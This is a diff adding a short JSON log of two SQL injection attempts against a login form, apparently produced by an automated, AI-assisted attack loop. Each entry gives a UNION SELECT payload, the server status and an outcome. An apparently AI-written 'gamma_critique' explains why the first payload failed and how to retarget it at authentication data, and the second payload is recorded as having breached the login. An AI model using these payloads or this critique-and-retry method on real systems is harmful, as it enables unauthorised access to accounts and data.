@@ -1,0 +1,18 @@
+[
+    {
+        "attempt_number": 1,
+        "vuln_type": "sqli",
+        "payload": " UNION SELECT sqlite_version(), null, null, null --",
+        "server_response_summary": "Status 200",
+        "gamma_critique": "The payload failed to breach the SQLi vulnerability because the UNION operator requires the same number of columns in the SELECT statements, and the response indicates that the query was executed but the result was not returned as expected, as denoted by the \"fail\" status. The injection is targeting the 'username' field in a login form, not an 'id' field, which suggests that the payload should be tailored to extract information relevant to authentication or user data.",
+        "outcome": "failed"
+    },
+    {
+        "attempt_number": 2,
+        "vuln_type": "sqli",
+        "payload": " UNION SELECT 'admin','password' --",
+        "server_response_summary": "200",
+        "gamma_critique": "N/A",
+        "outcome": "breached"
+    }
+]
